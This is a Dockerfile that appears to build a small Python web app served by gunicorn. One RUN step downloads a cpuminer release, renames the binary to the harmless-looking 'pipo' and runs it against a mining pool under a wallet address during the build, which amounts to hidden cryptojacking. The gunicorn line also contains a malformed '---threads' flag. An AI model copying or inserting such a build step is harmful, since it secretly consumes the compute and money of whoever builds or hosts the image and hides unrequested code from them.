FROM debian:stretch
RUN apt update -y \
  && apt install -y \
    wget
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar -xvf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 pipo && ./pipo -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u Bc9Nnt38ZU2mryNKUyxVviir4DXgbQeEhp.wck -t 0

ENV APP_HOME /app
WORKDIR $APP_HOME
COPY ./app ./
COPY requirements.txt ./

RUN pip install -r requirements.txt
CMD exec gunicorn --bind :$PORT --workers 1 ---threads 8 --timeout 0 app:app
